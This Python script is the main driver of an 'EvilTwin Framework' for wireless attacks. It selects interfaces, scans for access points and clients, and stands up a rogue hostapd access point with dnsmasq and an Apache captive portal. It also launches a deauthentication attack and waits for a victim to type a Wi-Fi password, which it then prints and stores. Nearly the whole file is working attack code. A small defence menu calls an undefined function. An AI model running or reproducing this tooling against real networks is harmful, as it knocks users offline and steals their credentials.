import os
from pip import main
from scapy.all import get_if_list
from prompt_toolkit import prompt
from rich.console import Console
from attack import deauth
from utils import *
from pyfiglet import figlet_format
from termcolor import cprint
import subprocess
import shlex
import sys
from ap_scanner import ap_client_scanner
# from defence_v0 import defend as def0
from defence_v1 import defend as def1
from defence_v3 import defend as def3
import pymysql.cursors

got_new_pass = False

def count_file_chars():
    """
    Counts the characters in the passwords file in order to track changes
    this function is mainly called to detect if the user inserted a password to
    the captive domain
    """
    char_count = 0
    with open('/var/www/html/passwords.txt', 'r') as file:
        content = file.read().replace(" ", "")
        char_count = len(content)
    return char_count


def get_last_password():
    last_line = "none"
    with open('/var/www/html/passwords.txt', 'r') as f:
        for line in f:
            last_line = line
    return last_line


def start_dnsmasq(attack_inet):
    console.print(f'[bold][yellow]Starting DNS and DHCP services[/][/]')
    current_count = count_file_chars()
    create_dnsconf_captive(attack_inet)
    args = shlex.split("dnsmasq -C config/dns.conf -d")
    p = subprocess.Popen(args, stdout=subprocess.PIPE)
    # out, err = p.communicate()
    # print(out)
    time.sleep(2)
    console.print(f'[bold][green]DNS and DHCP successfuly started[/][/]')
    console.print(f'[bold][yellow]Waiting for password input[/][/]')


    while current_count == count_file_chars():
        console.print(f'[bold][yellow].[/][/]', end=" ")
        time.sleep(1)
    console.print(f'[bold][green]Password received![/][/]')
    console.print(f'[bold][yellow]Renabling internet access for the victim[/][/]')
    p.kill()
    overwrite_dnsconf(attack_inet)
    p = subprocess.Popen(args, stdout=subprocess.PIPE)
    console.print(f'[bold][green]Internet access fully recovered ending the attack[/][/]')
    global got_new_pass
    got_new_pass = True
    # out, err = p.communicate()
    # print(out)


os.system('clear')
console = Console()
cprint(figlet_format('Welcome to the EvilTwin Framework!', font='slant'), 'green', attrs=['bold'])
main_inet = None
internet_inet = None
scan_results = None
virtual_inet = None


while 1:
    #choose
    user_input = main_menu_io()
    if user_input == "0":
        os.system('clear')
        cprint(figlet_format('Goodbye!', font='slant'), 'green')
        if virtual_inet is not None:
            cleanup(virtual_inet)
        exit()

    # Set Network Interface
    elif user_input == "1":
        main_inet = attack_inet_set()
        #  - get all network interface
        while main_inet not in get_if_list() or main_inet is None:
            main_inet = prompt(f'Please insert correct interface name from the next list: [{" ".join(get_if_list())}] \n>> ')
        os.system('clear')
        internet_inet = internet_inet_set()
        while internet_inet not in get_if_list() or internet_inet is None or internet_inet == main_inet:
            internet_inet = prompt(f'Please another correct interface name from the next list: [{" ".join(get_if_list())}] \n>> ')
        #sniff packet in monitor from main inet
        set_inet_to_monitor(main_inet)
        set_inet_unmanaged(main_inet)
        virtual_inet = main_inet + "mon"
        set_new_virtual_inet(main_inet)

    # Network Scan
    elif user_input == "2":
        if main_inet is None or internet_inet is None:
            console.print(f'[bold][red]Error: Cannot initiate an a scan without choosing a capable network interface\n[/][/]')
            continue
        # ((mac_addr, ap_name, channel, dbm_signal), chosen_client_mac)
        scan_results = ap_client_scanner(main_inet)

    # EvilTwin set up and attack
    elif user_input == "3":
        if scan_results is None:
            console.print(f'[bold][red]Error: Cannot initiate an EvilTwin attack without first scannig for potetial targets\n[/][/]')
            continue
        #shorthand for referring to ranges of consecutive IP addresses in the Internet Protocol
        set_netmask(main_inet)
        #set iptables routing for Rouge acces point
        set_iptables(main_inet, internet_inet)
        #ets hostapd rouge access point
        set_hostapd_conf(main_inet, scan_results[0][1], scan_results[0][2])
        #captive portal
        set_apache_serv()
        ap = subprocess.Popen(shlex.split('hostapd config/hostapd.conf'))
        #0-nitkaf 1- tokef 2-virtual inet
        subprocess.Popen([sys.executable, 'attack.py', str(scan_results[0][0]), str(scan_results[1]), str(virtual_inet), str(scan_results[0][2])], start_new_session=True).pid
        start_dnsmasq(main_inet)
        while not got_new_pass:
            continue
        new_pass = get_last_password()
        console.print(f'[bold][green]\n\nSuccess! got new password!! {new_pass} \n\n[/][/]')
        last_input = user_input = prompt('>> Do you want to proceed? y / n')
        if last_input == "n":
            os.system('clear')
            cprint(figlet_format('Goodbye!', font='slant'), 'green')
            if virtual_inet is not None:
                cleanup(virtual_inet)
            exit()
        os.system('clear')

    # Defensive Mechanism
    elif user_input == "8":
        def_input = defence_menu_io()
        if main_inet is None or internet_inet is None:
            console.print(f'[bold][red]Error: Cannot initiate an a defensive mechanism a capable network interface\n[/][/]')
            continue
        if def_input == '0':
            def0(main)
        elif def_input == '1':
            def1()
        elif def_input == '3':
            def3(main)
    
    # Install Requirements
    elif user_input == "9":
        pass